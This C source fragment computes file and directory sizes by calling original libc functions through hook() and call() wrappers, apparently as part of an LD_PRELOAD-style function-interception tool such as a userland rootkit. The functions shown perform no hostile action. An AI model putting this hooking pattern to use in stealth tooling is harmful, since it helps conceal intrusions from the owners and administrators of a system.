off_t getfilesize(const char *path){
    struct stat64 sbuf;

    hook(C__LXSTAT64);

    memset(&sbuf, 0, sizeof(struct stat64));
    if((long)call(C__LXSTAT64, _STAT_VER, path, &sbuf) < 0)
        return 0;

    return sbuf.st_size;
}

off_t getnewfilesize(const char *path, off_t fsize){
    return getfilesize(path)+fsize;
}

off_t getdirsize(const char *dirpath){
    off_t ret=0;
    DIR *dp;
    struct dirent *dir;

    hook(COPENDIR, CREADDIR);

    dp = call(COPENDIR, dirpath);
    if(dp == NULL) return 0;

    while((dir = call(CREADDIR, dp)) != NULL){
        if(!strcmp(".\0", dir->d_name) || !strcmp("..\0", dir->d_name))
            continue;

        char path[strlen(dirpath)+strlen(dir->d_name)+2];
        snprintf(path, sizeof(path), "%s/%s", dirpath, dir->d_name);
        ret = ret+getfilesize(path);
    }
    closedir(dp);

    return ret;
}

off_t getnewdirsize(const char *dirpath, off_t fsize){
    return getdirsize(dirpath)+fsize;
}